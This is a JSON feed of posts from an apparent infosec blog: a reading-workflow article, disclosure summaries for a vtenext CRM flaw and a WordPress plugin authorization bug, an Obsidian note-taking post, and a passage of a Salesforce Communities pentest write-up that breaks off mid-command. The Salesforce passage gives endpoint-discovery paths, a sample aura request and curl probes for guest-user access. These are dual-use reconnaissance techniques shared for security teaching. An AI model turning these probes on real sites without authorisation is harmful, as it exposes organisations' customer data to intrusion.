[
  
  {
    "title": "How I keep updated in the infosec industry",
    "url": "/posts/how-i-keep-updated/",
    "categories": "Articles & Writeups, InfoSec Education",
    "tags": "Inoreader, Obsidian, RSS, Instapaper, Raindrop.io",
    "date": "2026-02-02 00:00:00 +0100",
    "content": "Introduction  Happy 2026, two months late and with a new design for my blog! ü•≥  It had been quite a while since I last posted anything on my blog, and recently I have been trying to find a functional system to best consume and process online information.  So here we are, writing a blog post that will allow me to clarify my ideas (hopefullyspoiler, it did!) and at the same time give you some inspiration and possibly replicate my setup.  At the moment, I haven‚Äôt yet found a solution that fully satisfies me. My main requirements are:    Collecting information that I find interesting in a uniform and controlled manner   Saving these articles so that I can read them later when I have the opportunity (possibly also offline)   Reading articles comfortably   Highlighting text and then synchronise it with my notes inside Obsidian   Preferably, being able to listen to the articles when I cannot read.   Preferably, being able to resume reading from where I left off.   Preferably, have a feature that automatically summarises the article for me.   All this for free, without spending a penny, from any device, and without hosting anything (I know, I‚Äôm asking for quite a lot).  Strangely enough, however, I found two setups, very similar but with slightly different features, that almost completely meet my needs (only because Omnivore ceased to exist and therefore destroyed everyone‚Äôs setups).   Read it later workflow graph  Both setups and concepts are insipred by:    Chris Brooks‚Äôs Read Later Workflow   Saeed Esmaili‚Äôs RSS-based Content Consumption Workflow (btw, I really vibe with his blog post and his ‚Äúdesign‚Äù choices)   noperator‚Äôs How I keep up with new content   Daniel Prindii‚Äôs Read it later alternatives after Omnivore shutting down   Daniel Prindii‚Äôs My Read it later and discoverability systems in 2025   Discovering new content  It‚Äôs funny ‚Äì sort of ‚Äì because we‚Äôre in 2026 and, from a certain point of view, it feels like we‚Äôve gone back in time. Before, information was difficult to find because there was so little of it and it was often hidden. Now we experience the same difficulty because, instead, we are overexposed to useless, incorrect information that creates too much noise and hides the useful stuff.  RSS aggregator - Inoreader  To overcome this problem, I started using an RSS feed aggregator. Starting with the VoidSec‚Äôs RSS feed (which I still thank), over time I have curated my own personalised list of researchers, blogs, companies, newsletters, and forums that I want to stay up to date with.  Now, whenever one of them publishes a post or sends out a newsletter, it goes straight into my feed, without me having to go looking for it.  Over time, I have tried several free RSS readers. Of all of them, the one I liked the most is Inoreader, which I still use today and which is the cornerstone of my system.   Inoreader Home page  The free plan from Inoreader is very generous (you can follow up to 150 feed) and includes some nice interesting features, which for someone who is not too demanding might already be enough.  My favourites are:    Cross platform support and smooth experience: Both the web application and the progressive application for Android works very well. The native application for Android seems a bit outdated, but given the existence of the progressive web app, I ignore its existence.   Very nice UI: I personally really like the user experience Inoreader offers.            For each folder you create, you can set a different layout specific to your needs. Personally, the two I use most are List, for folders that receive many feeds per day, and Magazine, for more technical folders where I want to be able to scroll through the entire article inside a distraction-free window.      List vs Magazine layouts       Speaking of the distraction-free window, I really like its layout and graphic design. Personally, I use: font: Lora, font size: large, and line height: 1.7.       Custom share buttons: Inoreader is natively integrated with several external systems, including Instapaper and Raindrop. You can configure quick share buttons that will appear for each article, allowing you to save the article to these apps with a single click.       Keyword highlight: You can set filters that highlight a single word in a specific colour whenever it appears anywhere. This is very useful for recognising at a glance what topics a feed is discussing.  Inoreader reading window           Scroll tracking: Mark items as read when you scroll past them. This feature, combined with the sorting of articles from oldest to newest, allows me to speed up the triage phase considerably (more on this in a moment) and move my scrolling habbits on news instead of socials.   Send to device: For those who use the native Android application instead of the progressive app, this feature can be very useful for quickly sharing articles between devices.   Tags and Notes: Although there is a Pro version, tags and annotations (per article) are available free of charge. This is very useful for those who need to write a short summary/annotation of articles and to improve the management of key topics.   However, like any free product that has a paid version, Inoreader has paywalls that may be annoying:    The basic version does not allow any highlighting.   Mass operations are not permitted. This means that it is not possible to mass delete any old items that are important or saved within the tool.   While you can listen to articles via TTS, you only have 5 listens available per month.   Triage the collected articles  For me, the triage phase is the moment when I decide which of the feeds collected by Inoreader might interest me, and therefore should be saved to read later, or discarded.  This triage activity is very quick and requires only minimal effort. I mainly do it during downtime throughout the day, such as while drinking coffee, waiting for the train, or during breaks that are not long enough to allow me to read something.  As soon as I have a few minutes, I start scrolling through the feed list, glancing at the article title, description, and any words highlighted by my filters. If something particularly catches my attention, I open the feed in Google Chrome and use the Listen to this page 1 feature to generate a podcast-style AI summary of the content. Summaries usually take just a few minutes. If the article continues to interest me, then I send it to Instapaper/Raindrop.io along with some tags, otherwise I move on.   ‚ÄúListen to this page‚Äù inside Inoreader  Read it later - Consumption of items  Here, the workflow varies depending on which tool best suits your needs and preferences. Both tools are excellent, but they have clearly defined and, in some extent, opposing purposes and directions, which make each tool unique in its own way, but which, on the other hand, introduce a lot of ‚Äúfriction‚Äù if used improperly.  Instapaper  Instapaper is the classic read-it-later app that captures online content, cleans it up from distractions, and syncs it to your library. It has a very clean, minimalist look.   Instapaper GUI (Home)  It has some minor shortcomings compared to Raindrop.io, but it also has unique strengths that made me prefer it over the competition:    The native Android application allows for completely offline use. As someone who travels a lot by train, subway, and sometimes plane, the app allows me to read my articles even in these situations. Truly fantastic stuff!   The application keeps track of the exact point you reached while reading (or listening), allowing you to resume reading from where you left off.   The web application (and progressive app) integrate the AI article summarisation feature free of charge in the non-paid version. I hope that in the future this feature will also be carried over to the native Android version.   The native Android app integrates a free TTS reading feature. It‚Äôs not as good as Google Chrome‚Äôs (which I sometimes switch to because Instapaper reads code blocks, which the other tool doesn‚Äôt), but I‚Äôve read that they‚Äôre improving it and integrating AI, so I‚Äôm confident.   The other features are the usual ones, such as creating folders, applying tags, and archiving articles you have read. However, the ability to highlight and subsequently synchronise article highlights is very limited (only 5 highlights per month). It is also not possible to upload PDFs to the app with the FREE plan.   Instapaper reading window     On the web version, a huge limitation is the inability to perform searches! Use CTRL + F or tags wisely to overcome the issue.   Despite these limitations, it is the read-it-later application that I am currently using.  With Instapaper, I read (or listen to) every article that I have triaged and found interesting for the first time to understand what it is about in detail.  If, after a first reading, I realise that there is something I need to study in more depth on the computer or that I need to highlight and store, I save it in the Obsidian folder, from which I retrieve the articles to read a second time and study (more on this later). Finally, after an article has been processed, I move it to the Archive folder.  Raindrop.io  Raindrop.io is a modern, cross-platform, bookmark manager more than a read-it-later application. Nevertheless, it can be safely used as such. Bookmarks can be organised into various collections (which are simply folders) and can have tags.  Compared to Instapaper, it cannot be used offline. However, it is possible to search article titles, as well as search by folders, tags, highlights, dates, and other metadata. Honestly, the organisational features are superior.   Raindrop.io home page  With regard to highlights, Raindrop.io does not impose any limits on the number of highlights.  The app feels very modern, but the reading experience is not distracting; on the contrary, it is very pleasant. For many articles (fewer than Instapaper), you can read the content in a distraction-free window similar to the one in Inorearer. For articles whose content cannot be extracted, the tool embeds the pages directly within it.   Raindrop.io reading mode with highlights  The great thing, besides the absence of limits on highlights, is the ability to highlight and view highlights already made directly from the browser, using the official browser extension. This way, every time you browse a page that has already been highlighted (and has not changed over time), its content will be highlighted as soon as you open it.   Highlights shown directly in the browser  Unfortunately, though, the lack of reading point tracking features and the inability to read offline make the application slightly inferior from a purely reading perspective.  Highlights - Content digestion  Reading for its own sake is fine, but it is not preparatory to study unless accompanied by some other technique for remembering and storing important points. That‚Äôs why highlighting (and reworking) content is important in my workflow.  The highlighting phase usually only applies to the second reading of an article that I need to study. After reading it the first time and forming an idea of what I consider important and what I don‚Äôt, I do a second reading and highlight what I want to memorise.  I usually do this stage on the computer, generally at the weekend or whenever I have a few hours free. I open the tool where I have saved the articles that need a second read-through, and I focus on highlighting them.  The ultimate goal is to synchronise these highlights within Obsidian. To do this, depending on the tool I used, I use a complementary support tool:    Obsidian Web Clipper (if I used Instapaper for reading)   Obsidian Raindrop.io Plugins (if I had already highlithed something within Raindrop.io)   Obsidian Web Clipper  Since the free version of Instapaper does not allow highlighting, I decided to use Obsidian Web Clipper to compensate.  The Obsidian Web Clipper is an official browser extension designed to bridge the gap between the internet and your personal knowledge base. The plugin uses a secure ‚Äúhandshake‚Äù to send the processed text directly to your local Obsidian vault, but actually does several things:    Allows you to read articles in a distraction-free environment   Allows you to clip the HTML content of a page and convert it entirely into markdown.  Page content converted to markdown   It allows you to highlight text and images within your browser and export them to Markdown, but also see the highlights the next time you visit the page (similar to Raindrop.io)  Web clipper reading mode with highlights   Manage the markdown templates used for export and integrate them with certain AI functionalities.   # {{title}}  ![]({{meta:property:og:image}})  &gt; [!summary]+ &gt; {{\"a summary of the page. If you need to go to a new line, prepend the quote and space symbol (&gt; ) at the start of the each line\"}}  {{content}}   Tailored to my workflow, for each article in the Obsidian folder (which has therefore already been read), I open it, highlight the important parts with the tool, generate a summary with Gemini, and send everything to my Obsidian vault. Then, I archive the article within Instapaper.  Obsidian Raindrop.io Plugins  Given the native ability to highlight content in Raindrop.io, the only requirement is to have a bridge between the tool and Obsidian.  There are several types of integration available. The two most common are:    Obsidian plugin obsidian-raindrop-highlights-plugin 2   Obsidian plugin make-it-rain   Both plugins allow you to import your highlights into Obsidian using customisable templates.  My template is the following:  # {{title}}  {% if cover %}![]({{cover}}){% endif %} {% if excerpt %} &gt; [!summary] &gt; {{excerpt}} {% endif %}  {% if note %}note: {{note}}{% endif %}  {% for highlight in highlights %} {% if highlight.color == \"red\" -%}     {%- set callout = \"danger\" -%} {%- elif highlight.color == \"blue\" -%}     {%- set callout = \"info\" -%} {%- elif highlight.color == \"green\" -%}     {%- set callout = \"check\" -%} {%- elif highlight.color == \"orange\" -%}     {%- set callout = \"warning\" -%} {%- else -%}     {%- set callout = \"\" -%} {%- endif -%}  {% if callout !== \"\" -%}  &gt; [!{{callout}}] &gt; {{highlight.text.split(\"\\n\") | join(\"\\n&gt;\")}} {% if highlight.note -%}&gt; &gt; {{highlight.note + \"\\n\"}}{%- endif %} {%- else -%} {{highlight.text.split(\"\\n\") | join(\"\\n\")}} {%- endif -%} {%- endfor -%}   {% if title %}title: \"{{title}}\"{% endif %} {% if excerpt %} description: |-   {{ excerpt | indent(2) }} {% endif %} {% if link %}source: {{link}}{% endif %} {% if rindropUrl %}raindrop_url: {{rindropUrl}}{% endif %} {% if created %}created: {{ created | date(\"YYYY-MM-DD\") }}{% endif %} sync-date: {{now}} tags:   - \"_index\" {% if tags|length %} {% for tag in tags %}    - \"{{ tag }}\"{% endfor %} {% endif %}   Refining and connecting knowledge (Obsidian)  The highlights arrive in the second memory in a format that needs to be refined (depending on the tool that captured the highlight). In the case of Web Clipper, the content is already almost completely formatted correctly; whereas in the case of Raindrop.io, chapters, formatting and code need to be refined.  I usually do the finishing touches on my notes immediately after capturing the information.  Once the notes are ready, I go through my vault looking for connections to the information I just captured (obsidian-smart-connections is the big helpers here).  Finally, I link all the notes together and back up the vault on GitHub.                   Use the Listen to this page mode in Chrome; google.com¬†&#8617;&#xfe0e;                 The one I personally used¬†&#8617;&#xfe0e;"
  },
  
  {
    "title": "Vtenext 25.02 vulnerability research",
    "url": "/posts/vtenext-25-02-a-three-way-path-to-rce/",
    "categories": "Disclosed Vulnerabilities",
    "tags": "PHP, ATO, xss, lfi, rce",
    "date": "2025-08-12 00:00:00 +0200",
    "content": "Summary     Product   VTENEXT CRM   Vendor   vtenext   Severity   Critical   Impact   Authentication Bypass and Remote Code Execution   Affected Version(s)   25.02* and below   Tested Version(s)   20.04, 24.02, 25.02, 25.02.1   First Patched Version   25.02.2   Abstract     Multiple vulnerabilities in vtenext 25.02.1 and prior versions allow unauthenticated attackers to bypass authentication through three separate vectors, ultimately leading to remote code execution on the underlying server.   You can read the full article on the SicuraNext blog.  Disclosure Timeline    Please refer to the disclosure policy page for further details about the disclosure policy adopted by 0xbro.      28/05/2025: Contacted vtenext for the first time through various communication channels, but did not receive any response.   05/06/2025: Contacted vtenext for the second time, but didn‚Äôt receive any response again.   09/06/2025: Submitted CVE Request 1879483 to MITRE (still awaiting official CVEs).   13/07/2025: Attempted to contact the developers of vtenext via a direct channel on LinkedIn, but without success.   24/07/2025: Vendor released version 25.02.1 containing a silent patch for the Arbitrary Password Reset vulnerability.   12/08/2025: Full disclosure, since a patch exists and the grace period has expired.   ??/08/2025: Vendor released version 25.02.2 containing a patch for the other vulnerabilities.   04/09/2025: Following a call with the vtenext team, it was decided to reduce the technical details of the vulnerabilities to give users time to update to the latest version and the team time to patch the remaining vulnerabilities."
  },
  
  {
    "title": "Incorrect Authorization to Authenticated (Contributor+) Multiple Media Actions in Prevent Direct Access Wordpress Plugin (CVE-2025-3861)",
    "url": "/posts/wp-prevent-direct-access-CVE-2025-3861/",
    "categories": "Disclosed Vulnerabilities",
    "tags": "PHP, wordpress, BAC",
    "date": "2025-04-24 00:00:00 +0200",
    "content": "The Prevent Direct Access ‚Äì Protect WordPress Files plugin for WordPress is vulnerable to unauthorized access and modification of data due to a misconfigured capability check on the pda_lite_custom_permission_check function in versions 2.8.6 to 2.8.8.2. This makes it possible for authenticated attackers, with Contributor-level access and above, to access and change the protection status of media.     Summary     Product   Prevent Direct Access ‚Äì Protect WordPress Files   Vendor   WP Folio Team   Active installations   10,000+   Severity   Medium   Affected Version(s)   2.8.6 - 2.8.8.2   Fixed version   2.8.8.3   CVE   CVE-2025-3861   CVE Description   The Prevent Direct Access ‚Äì Protect WordPress Files plugin for WordPress is vulnerable to unauthorized access and modification of data| due to a misconfigured capability check on the `pda_lite_custom_permission_check` function in versions 2.8.6 to 2.8.8.2. This makes it possible for authenticated attackers, with Contributor-level access and above, to access and change the protection status of media.   CWE   CWE-863: Incorrect Authorization   CVSS 3.1 Score  Base Score:¬†5.4 (Medium) Vector String:¬†CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N                 Metric       Value                       Attack Vector (AV)       Network                 Attack Complexity (AC)       Low                 Privileges Required (PR)       Low                 User Interaction (UI)       None                 Scope (S)       Unchanged                 Confidentiality (C)       Low                 Integrity (I)       Low                 Availability (A)       None           Vulnerability Details  Prevend Direct Access exposes 4 different REST api:  [   \"/pda-lite/v1\",   \"/pda-lite/v1/files/(?P&lt;id&gt;\\\\d+)\",   \"/pda-lite/v1/private-urls/(?P&lt;id&gt;\\\\d+)\",   \"/pda-lite/v1/un-protect-files/(?P&lt;id&gt;\\\\d+)\" ]  These APIs are intended to manage and restrict Media access to administrators or media owners only.  Each of them validates the privileges of the user who is interacting with the API via a custom callback called pda_lite_custom_permission_check:  /includes/pda_lite_api.php ... register_rest_route(PDA_Lite_Constants::PREFIX_API_NAME, '/files/(?P&lt;id&gt;\\d+)', array(     'methods' =&gt; 'POST',     'callback' =&gt; array($this, 'protect_files'),     'permission_callback' =&gt; array( $this, 'pda_lite_custom_permission_check' ), )); ... register_rest_route(PDA_Lite_Constants::PREFIX_API_NAME, '/files/(?P&lt;id&gt;\\d+)', array(     'methods' =&gt; 'GET',     'callback' =&gt; array($this, 'is_protected'),     'permission_callback' =&gt; array( $this, 'pda_lite_custom_permission_check' ), )); ... public function pda_lite_custom_permission_check() {     return current_user_can('edit_posts') ||      current_user_can('manage_options'); }  In the pda_lite_custom_permission_check() function, authorization is granted if the user possesses either the manage_options or edit_post capability. However, according to the WordPress documentation 1, the edit_post capability is available to Contributor, Author, and Editor roles ‚Äî not just Administrators.  As a result, users with lower privileges can access the relevant APIs and perform various media-related actions, potentially bypassing media protection mechanisms.  References     Root cause in pda_lite_api.php   Changeset for version 2.8.8.3                    Roles and Capabilities¬†&#8617;&#xfe0e;"
  },
  
  {
    "title": "Effective Notes for OSCP, CTFs and Pentests with Obsidian (2025)",
    "url": "/posts/effective-notes-with-obsidian/",
    "categories": "Articles & Writeups, InfoSec Education",
    "tags": "OSCP, obsidian, note-taking",
    "date": "2025-03-15 00:00:00 +0100",
    "content": "Introduction  In 2022, I made a video explaining my note-taking methodology useful for CTFs, security certifications like the OSCP, and more generally any penetration test.  Many things have changed since the last time, including the way I think and take notes, and considering, also, the number of views the old video is getting, I decided to make a newer one.  The note-taking application I‚Äôm using is again Obsidian, this time featuring some third-party plugins that really empower most of its features, but I moved from a traditional ‚Äúvertical text-based notes‚Äù to ‚Äúwhiteboard‚Äù ones.  Why did I decide to use whiteboards? Are you familiar with those murder boards popular in thriller films and TV series, where the investigators have everything in front of them?  The reason is the same: I wanted something that would allow me to pin down everything I need on the fly and that would allow me to keep ALL findings in view at the same time.  Having a whiteboard on which you can draw and move things around will dramatically increase the potential of your notes, allowing you to create graphs and diagrams that would otherwise not be possible with a traditional approach.  I won‚Äôt go into detail about how Obsidian works as I‚Äôve already talked about it in the past and the basic operation hasn‚Äôt changed. Take a look at that video first in case you missed the basics, otherwise let‚Äôs download the project, open it with Obsidian, and take a look to the required community plugins first.  There are several community plugins that could be useful for you and that you could perhaps integrate into your workflows. For example, I use 19 different plugins in my personal project, most of which are quality of life enhancements, but the key ones in our case are a few:  Advanced Canvas and alternatively Excalidraw, are the core of the whole mechanism and it is they who enable the implementation of whiteboards within Obsidian. Depending on your tastes and use cases, using one may be more convenient than using the other, but we will go into the differences between the two later in the video.  Then, the Kanban plugin allows us to create a board for managing tasks and ToDos using a Kanban approach.  ‚ÄúPaste image rename‚Äù and ‚ÄúPaste URL into selection‚Äù are two utilities that enhance Obsidian‚Äôs pasting capabilities saving you times when pasting links or images.  Finally, ‚ÄúQuiet outline‚Äù enhances Obsidian‚Äôs outline and table of contents with better GUI and more features. Again, this is a quality of life improvement.  OK, almost there. Before working live with the template, I wanted to digress a little more on some settings that I consider fundamental. This section of the video is not obligatory, but I still recommend you follow it if you are thinking of integrating your vault with GitHub. If not, feel free to skip to the next chapter.  The first settings we must change are ‚ÄúUse Wikilinks‚Äù and ‚ÄúNew link format‚Äù. Here we must disable the use of Wikilinks and set ‚ÄúRelative path to file‚Äù as the default behaviour. Then we have to change the setting ‚ÄúDefault location for new attachments‚Äù to ‚ÄúIn subfolder under current folder‚Äù. The reason for these changes is to facilitate the integration and use of our notes also on other platforms, especially if we plan to use Obsidian as a cheatsheet. Let‚Äôs take GitHub as an example. GitHub does not support the use of Wikilinks, and all files uploaded to GitHub will be hosted in the root directory of your repository. This means that if we want to use GitHub as a backup and properly navigate our notes on the platform, we won‚Äôt be able to use the other settings in Obsidian because, in either case, the links would be broken. However, by using the combination mentioned above, we will ALWAYS be able to maintain working links suitable for the GitHub format.  I also suggest enabling all the plugins you see active right now while scrolling the list, especially the ‚ÄúTemplates‚Äù plugin. It will allow you to create template notes inside a specific folder that you can quickly import into other Obsidian pages. In the project I uploaded for you, I‚Äôve already created some useful templates, so by enabling this plugin, you can easily embed them into your notes using Obsidian‚Äôs quick commands.  Great! Now that everything is set up correctly, let‚Äôs drop a like to the video and subscribe to my channel. It would be appreciated so much, so thanks in advance, but now let‚Äôs take a hands-on look at the template!  Video   References     Obsidian template - GitHub   Obsidian template - Google Drive (password is notes-4-oscp!)"
  },
  
  {
    "title": "Pentesting Salesforce Communities",
    "url": "/posts/salesforce-hacking/",
    "categories": "Articles & Writeups, Web Hacking",
    "tags": "salesforce, ATO",
    "date": "2024-12-02 00:00:00 +0100",
    "content": "Introduction  As mentioned in the abstract above, this blog post is intended to be a summary of a broader penetration test activity I conducted for a client. Following a security incident, I was tasked with analysing a large number of Salesforce Communities for issues and vulnerabilities. This allowed me to familiarise myself with this technology and to learn more about the main flaws and problems of these systems.  Salesforce lightning 101  Salesforce Lightning is a component-based framework for Salesforce app development. Usually, sites built with Lightning use one of the following URLs (but this is not always the case):     *.force.com   *.secure.force.com   *.live.siteforce.com   For the sake of brevity, I will skip over most of the basic concepts concerning Salesforce, Salesforce Communities, and Salesforce Lighting, as there are already numerous resources on this subject online (and even AI can give you the basic answers you seek).  Please refer to the official documentation12 and articles below for a general introduction to the topic:    What are Salesforce Communities? (written by Nitay Bachrach, varonis.com)   What is Salesforce Lightning? (written by Aaron Costello, enumerated.ie)   Introduction to Salesforce SAAS Applications (written by Praveen Kanniah, infosecwriteups.com)   However, there are some important concepts and quirks that I cannot take for granted, so we will look at them here quickly.  Terminologies    Salesforce Community: these are sites that run on Salesforce‚Äôs Lightning framework and let customers and partners interface with Salesforce instances from outside an organization. Communities are public-facing and indexed by Google.   Salesforce Lightning Component Framework: is a component-based framework for Salesforce app development. It includes the views (markup) and JS controllers on the client-side, then Apex controllers and databases on the server side. Default lightning components for example are ui, aura, and force. Those components are self-contained objects that a developer can assemble to create custom web pages.   Aura components perform actions on Salesforce objects. Components have controllers that export different methods (or actions) to perform certain tasks. These are functions that interact in some ways with Objects. Params can also be passed to these functions. There are two types of controllers:            Standard aura classes (aura://), pre-formatted functions to access Salesforce objects       Custom apex classes (apex://), new functions developed from scratch by developers.           Objects 3, in Salesforce, can be considered like DB tables for storing data. They can be:            Standard Objects 4 (also labled Default Objects), and they are objects secured by SalesForce. A full list can be found here.       Custom Objects 5, identified by the __c in their name (like level__c). These are objects created manually by admins.           Fields are like DB table columns   Records are like DB table rows   Namespace - Think of it like a package, which groups related components together. Default namespaces are aura, ui, and force. Custom components that are created and added to a community will either use the namespace chosen by the Salesforce administrator, the namespace of a package or simply use the c namespace which refers to the default namespace.    (image taken from appomni.com)  Guest User An unauthenticated user is called a¬†Guest User¬†in Salesforce. In recent versions he is not enabled by default, however, it‚Äôs not rare to find them enabled in the wild.  You can usually easily recognise if the guest user is enabled because you will see many automatic requests to the /aura endpoint in the background (however that‚Äôs not always true).  Salesforce security controls     Permissions are set for objects, fields, and records¬†separately!   Objects have a very complex sharing model:    CRUDS   Groups   Sharing Rules   Owner [+Manual] [+Territory] [+Role]   etc.   And custom objects are rarely configured with the correct OLS/FLS/RLS.  Quoting ‚ÄúHow does Salesforce Lightning implement security? ‚Äú:    From an attacker‚Äôs perspective, the main security controls to be concerned with essentially boil down to the following (open the links to the original article for a detailed explanation of what it is all about):        Object Level Security (OLS) - This is often referred to as CRUD within Salesforce documentation     Field Level Security (FLS)     Record Level Security (RLS)      Also consider that in Lightning there is no real administrator, but there are specific groups created to perform privileged/restricted actions. This is to simplify authorizations, but this is where custom objects become a problem.  HTTP request format, Aura Components and APEX  Aura components, Apex, and Salesforce form the backbone of Salesforce‚Äôs Lightning platform, empowering developers to build dynamic, interactive web applications. Aura components are reusable, modular building blocks that enable the creation of rich user interfaces, while Apex is Salesforce‚Äôs proprietary programming language, used to implement complex business logic on the server-side.  Some useful resources for getting started poking around with aura components:    Get Started with Aura Components, developer.salesforce.com   Quick Start: Aura Components, trailhead.salesforce.com   The Apex classes that have methods that are denoted with @AuraEnabled are what interest us the most, as these methods can be called remotely through the Aura endpoint. Unfortunately, without access to the code itself, exploitation of apex class methods will always be done in blackbox (unless the class is open source).  Salesforce standard HTTP requests to aura components 6 look like the following:  POST /s/sfsites/aura?r=4&amp;ui-communities-components-aura-components-forceCommunity-richText.RichText.getParsedRichTextValue=1 HTTP/2 Host: salesforce.example.com Cookie: ... SNIPPED ... Content-Length: 1324 X-Sfdc-Page-Scope-Id: 69b7ebbe-2e8b-4622-9738-06da97612d69 X-Sfdc-Request-Id: 22933900001b9f0ff3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Sfdc-Page-Cache: c29575b7054d1291  message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2291%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.communities.components.aura.components.forceCommunity.richText.RichTextController%2FACTION%24getParsedRichTextValue%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2FforceCommunity%3ArichText%22%2C%22params%22%3A%7B%22html%22%3A%22%3Cp%20style%3D%5C%22text-align%3A%20right%3B%5C%22%3E%3Cimg%20class%3D%5C%22sfdcCbImage%5C%22%20alt%3D%5C%22%5C%22%20src%3D%5C%22%7B!contentAsset.NPAZ_599283a16ca1463fa0523e4088b460.1%7D%5C%22%20style%3D%5C%22width%3A%20368.115px%3B%20height%3A%2096.0625px%3B%5C%22%3E%3Cimg%20class%3D%5C%22sfdcCbImage%5C%22%20alt%3D%5C%22%5C%22%20src%3D%5C%22%7B!contentAsset.NPAZ_599283a16ca1463fa0523e4088b4602.1%7D%5C%22%20style%3D%5C%22width%3A%20377.013px%3B%20height%3A%2098.3875px%3B%5C%22%3E%3C%2Fp%3E%22%7D%2C%22version%22%3A%2261.0%22%2C%22storable%22%3Atrue%7D%5D%7D&amp;aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22UnpnOFNpOGttZTd0bGJqRkN2T2pGQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%2248jFr9jtMWnzXaDp1ibM3w%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&amp;aura.pageURI=%2Fs%2F%3Flanguage%3Den_US&amp;aura.token=null   The HTTP body once decoded looks like this: message={   \"actions\": [     {       \"id\": \"91;a\",       \"descriptor\": \"serviceComponent://ui.communities.components.aura.components.forceCommunity.richText.RichTextController/ACTION$getParsedRichTextValue\",       \"callingDescriptor\": \"markup://forceCommunity:richText\",       \"params\": {         \"html\": \"&lt;p style=\\\"text-align: right;\\\"&gt;&lt;img class=\\\"sfdcCbImage\\\" alt=\\\"\\\" src=\\\"{!contentAsset.NPAZ_599283a16ca1463fa0523e4088b460.1}\\\" style=\\\"width: 368.115px; height: 96.0625px;\\\"&gt;&lt;img class=\\\"sfdcCbImage\\\" alt=\\\"\\\" src=\\\"{!contentAsset.NPAZ_599283a16ca1463fa0523e4088b4602.1}\\\" style=\\\"width: 377.013px; height: 98.3875px;\\\"&gt;&lt;/p&gt;\"       },       \"version\": \"61.0\",       \"storable\": true     }   ] }&amp;aura.context={   \"mode\": \"PROD\",   \"fwuid\": \"UnpnOFNpOGttZTd0bGJqRkN2T2pGQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41\",   \"app\": \"siteforce:communityApp\",   \"loaded\": {     \"APPLICATION@markup://siteforce:communityApp\": \"48jFr9jtMWnzXaDp1ibM3w\"   },   \"dn\": [],   \"globals\": {},   \"uad\": false }&amp;aura.pageURI=/s/?language=en_US &amp;aura.token=null      You can use the salesforce/lightning-burp burpsuite extension plugin for better handling Lightning.   The important fields to be considered in the HTTP body are:    message: contains a JSON object that encapsulates all necessary data for structuring the communication between the client-side Lightning components and Salesforce‚Äôs back-end.   aura.context: provides essential metadata, state information, and security-related details that the server needs to process the request effectively. It encapsulates a variety of contextual data that enables the server to understand the environment in which the request is made.   aura.token: the value will show whether or not you are authenticated. undefined or null values indicate you are a Guest User, otherwise a JWT token contains your user information.   message contains actions (typically JavaScript functions or Apex controller methods) that need to be executed. Each action corresponds to a specific operation that the client is asking the server to perform, and is made up by:    id: random string used to identify multiple actions in the same request   descriptor: A reference to the controller method or component action being invoked, in the form namespace:component (usually has the form namespace://contoller-class/ACTION$method-to-invoke).   callingDescriptor: usually ‚ÄúUNKNOWN‚Äù since it is often ignored, but usually references the component or controller that initiated the action.   params: parameters provided to the action.      The aura.context and aura.token fields are not strictly tied to a single website, but can be reused (with minor adjustments) in any other Salesforce application, especially when the Guest User is enabled. This is very useful, especially for interacting with instances that support the guest user and have enabled the aura endpoint, but that do not send requests automatically (and therefore do not provide a starting ‚Äúrequest template‚Äù).   Salesforce enumeration  Identify the targets  Depending on the scope of the activity and the amount of time available, there are several ways to fingerprint Salesforce sites. Usually, a good way to start is to use Google dorks and search for common CNAMEs or common DNS. 7  Luckily in my case, I had already been provided with a DNS list of the client‚Äôs Salesforce sites (but not the communities), so I could start scanning and enumerating the sites directly without having to search for them first.  Identify the aura endpoint  As mentioned before, the /aura endpoint is an essential component for Salesforce sites and it is an important element when it comes to the threat model of applications.  The endpoint is typically exposed on a standard path, however it may also be exposed on a path other than the root (usually happens when several communities are hosted on the same site, so each of them has its own aura endpoint), and is not always contacted automatically when navigating to a Salesforce site:  ## Standard endpoint /aura /sfsites/aura /s/sfsites/aura  ## Custom communities endpoint can start with other words, eg. /admin/s/sfsites/aura /customers/aura /foo/bar/sfsites/aura   You can search for such paths using some common nuclei templates 8 or you can do it manually by sending an HTTP POST request and looking for the following patterns:  ## Search for these patterns in server response: \"actions\":[ aura:clientOutOfSync aura:invalidSession   A good way to find the aura endpoint and the available communities without brute-forcing them is to use some passive recon tools like gau 9 or waymore 10 and search for the /s/ pattern within the extracted URLs:  $ gau redacted.my.site.com         https://redacted.my.site.com/ https://redacted.my.site.com/random-asd-1/s/article/What-steps-do-you-take-to-ensure-website-accessibility https://redacted.my.site.com/foo-bar-boom/s/mexico https://redacted.my.site.com/Beep/s/equipment-listing https://redacted.my.site.com/RAM/s/mexico https://redacted.my.site.com/robots.txt https://redacted.my.site.com/never-back-again/s/ https://redacted.my.site.com/ https://redacted.my.site.com/never-back-again/s/?language=en_US https://redacted.my.site.com/ContactUs1337-pathUS/s/ https://redacted.my.site.com/login https://redacted.my.site.com/Beep/s/ https://redacted.my.site.com/login?locale=us  $ curl -X POST https://redacted.my.site.com/Beep/s/sfsites/aura -H \"Content-Type: application/x-www-form-urlencoded\" -d 'foo=bar' {\"event\":{\"descriptor\":\"markup://aura:invalidSession\",\"attributes\":{\"values\":{}},\"eventDef\":{\"descriptor\":\"markup://aura:invalidSession\",\"t\":\"APPLICATION\",\"xs\":\"I\",\"a\":{\"newToken\":[\"newToken\",\"aura://String\",\"I\",false]}}},\"exceptionMessage\":\"Guest user access is not allowed\",\"exceptionEvent\":true} $ curl -X POST https://redacted.my.site.com/random-asd-1/aura -H \"Content-Type: application/x-www-form-urlencoded\" -d 'foo=bar' 